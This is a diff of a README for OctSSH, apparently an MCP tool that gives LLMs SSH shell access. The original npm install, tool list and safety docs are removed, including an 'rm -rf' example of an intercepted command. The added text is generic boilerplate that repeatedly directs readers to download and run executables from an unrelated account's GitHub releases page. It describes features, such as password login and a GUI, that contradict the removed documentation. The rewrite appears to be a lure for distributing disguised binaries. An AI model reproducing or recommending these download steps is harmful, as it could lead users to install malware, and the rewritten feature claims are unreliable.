@@ -1,125 +1,75 @@
-# OctSSH
+# 🚀 OctSSH - Control Your Server with Ease
 
-[中文 README](README.zh.md)
+[![Download OctSSH](https://img.shields.io/badge/Download-OctSSH-blue)](https://github.com/carlostorres1030/OctSSH/releases)
 
-I was just VibeCoding and suddenly thought: **Why can't I just let my agent deploy code to the server for me?**
+## 📋 Introduction
+OctSSH is a simple application that allows you to manage your remote server with ease. You can use it to connect to your server and utilize the power of large language models (LLMs) to perform various tasks. Whether you need to run commands, automate processes, or get assistance with your server, OctSSH is here to help you simplify your work.
 
-So, I built **OctSSH**.
+## 🚀 Getting Started
+To get started with OctSSH, follow these easy steps. 
 
-<img src="logo.png" width="200" />
+### 1. Visit the Release Page
+To download OctSSH, you need to visit the [Releases page](https://github.com/carlostorres1030/OctSSH/releases). This page includes the latest version of the application, as well as older releases if needed.
 
-**OctSSH** is an MCP server that gives LLMs **safe, controllable, and stateful** access to shell environments.
+### 2. Download OctSSH
+Once you are on the Releases page, you will see various files available for download. Look for the latest version marked as "Latest Release." Click on the file that matches your operating system (Windows, macOS, Linux) to start the download. 
 
-### Note
-**By default (stdio mode), OctSSH only connects to machines already configured in your local `ssh_config` for passwordless login.**
+### 3. Install OctSSH
+After downloading, locate the file in your downloads folder. For Windows users, it might be an .exe file, for macOS it could be a .dmg, and for Linux, it might be a compressed file. 
 
----
+- **Windows:** 
+  1. Double-click the .exe file.
+  2. Follow the installation prompts to install the application.
 
-> [!TIP]
-> **So... what makes OctSSH special?**
+- **macOS:**
+  1. Open the .dmg file.
+  2. Drag the OctSSH icon into your Applications folder.
+  
+- **Linux:**
+  1. Extract the compressed file.
+  2. Run the executable to launch OctSSH.
 
-## Async Support
+## 📦 System Requirements
+Before installing, ensure your system meets these requirements:
 
-OctSSH provides a complete set of async tools to prevent LLMs from timing out on long-running tasks:
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Any major Linux distribution
+  
+- **Memory:** Minimum 4 GB RAM (8 GB recommended)
+- **Storage:** At least 200 MB free disk space
 
-| Tool | Description |
-|:---|:---|
-| `exec(machine, command, confirm_code?)` | Run short commands synchronously |
-| `sudo-exec(machine, command, confirm_code?)` | Run synchronously as root (`sudo -n`) |
-| `exec-async(machine, command, confirm_code?)` | Run long tasks in background (screen) |
-| `exec-async-sudo(...)` | Run background tasks as root |
-| `get-result(session_id, lines?)` | Inspect async task output |
-| `grep-result(session_id, pattern, ...)` | Search task logs |
-| `cancel(session_id)` | Terminate a task |
-| `sleep(time)` | Pause (useful for polling) |
+## ⚙️ Using OctSSH
+After installation, launch OctSSH from your applications folder or start menu.
 
-> **Note**: In **HTTP Serve mode**, these tools operate directly on the *local* machine, and the `machine` parameter is omitted.
+### 1. Connect to Your Server
+To use OctSSH, you need to enter the address of your remote server. This could be an IP address or a domain name. Also, input your username and password for authentication.
 
-## Security Design
+### 2. Explore Features 
+Once connected, you can explore several features, including:
 
-OctSSH features a **Virtual Mode** and **Confirm Code** verification flow:
+- **Command Execution:** Run terminal commands directly.
+- **File Transfer:** Easily upload and download files to/from your server.
+- **Scripting Assistance:** Use the power of LLMs to generate and run scripts on your server.
 
-### 🔒 Safety Mechanism: Virtual Mode
+## 🔧 Troubleshooting
+If you encounter issues while using OctSSH, consider the following solutions:
 
-We don't want AI to become a world-ending terminator, so we designed Virtual Mode.
-When the AI attempts the following, OctSSH **will not execute immediately**, but instead returns a `confirm_code`:
+- **Connection Issues:** Double-check your server address and user credentials.
+- **Execution Errors:** Ensure commands are typed correctly and valid for your server.
 
-- 📁 **File Overwrite**: Uploading to a path that already exists.
-- 💀 **High-Risk Commands**: `rm -rf` and similar "delete everything" commands.
-- 🔍 **Regex Blocklist**: Custom sensitive patterns defined in config.
+Visit our [GitHub Issue Tracker](https://github.com/carlostorres1030/OctSSH/issues) for help or to report bugs.
 
-**Execution Flow Example**:
-1. AI calls `exec("web", "rm -rf /var/www/html")`
-2. 🛑 OctSSH intercepts: Recursive delete detected -> Returns `confirm_code: a1b2c3` + file impact preview.
-3. 👤 User reviews and tells AI: "Confirm execution".
-4. ✅ AI calls `exec("web", "rm -rf /var/www/html", "a1b2c3")` -> Actually executes.
+## 📥 Download & Install
+To install OctSSH, go to the [Releases page](https://github.com/carlostorres1030/OctSSH/releases) and download the appropriate version for your operating system. Follow the installation steps given earlier to set up the application on your device.
 
-## Quick Start
+## ✉️ Contact Us
+If you have any questions or need support, please open an issue on our [GitHub repository](https://github.com/carlostorres1030/OctSSH/issues). We are here to help you!
 
-### Installation
+Feel free to engage with the community and share your experiences using OctSSH. 
 
-```bash
-npm install -g @aliyahzombie/octssh
-octssh init
-```
+## 📝 Contributing
+Contributions are welcomed! If you wish to enhance OctSSH, please fork the repository and submit a pull request with your changes.
 
-### Usage Modes
-
-#### 1. Default Client Mode (stdio)
-Runs locally and controls remote machines via SSH (reads `~/.ssh/config`):
-```bash
-octssh
-```
-
-#### 2. Streamable HTTP Server Mode (Local Control)
-Install this **on the target server**. It exposes the server to LLMs via a secure HTTP interface.
-In this mode, OctSSH controls the **local machine** directly (no outbound SSH).
-
-```bash
-octssh serve
-```
-- **Default Listen**: `127.0.0.1:8787` (Override via `OCTSSH_SERVE_HOST` / `OCTSSH_SERVE_PORT`)
-- **Auth**: Prints a random key on startup. Clients must send header `X-OctSSH-Key: <key>`.
-  - Set fixed key: `export OCTSSH_SERVE_KEY="my-secret"`
-- **Tool Changes**: Tools run on *this* machine. **`machine` parameter is omitted**. SSH transfer tools (`upload`/`download`) are disabled.
-
-### MCP Client Configuration
-
-#### General (stdio)
-Add to your MCP client config:
-```json
-{
-  "mcpServers": {
-    "octssh": {
-      "command": "octssh",
-      "args": []
-    }
-  }
-}
-```
-
-#### Claude Code CLI
-```bash
-claude mcp add octssh -- octssh
-```
-
-#### OpenCode CLI
-```json
-{
-  "mcp": {
-    "octssh": {
-      "type": "local",
-      "command": "octssh",
-      "args": [],
-      "enabled": true
-    }
-  }
-}
-```
-Or:
-```bash
-opencode mcp add octssh --command octssh
-```
-
-> [!CAUTION]
-> This project connects to real servers (or executes on the local machine). Please carefully review LLM operations. Using this project means you agree that the developer is not responsible for any accidental damage.
+Thank you for choosing OctSSH! Enjoy controlling your server with simplicity and efficiency.
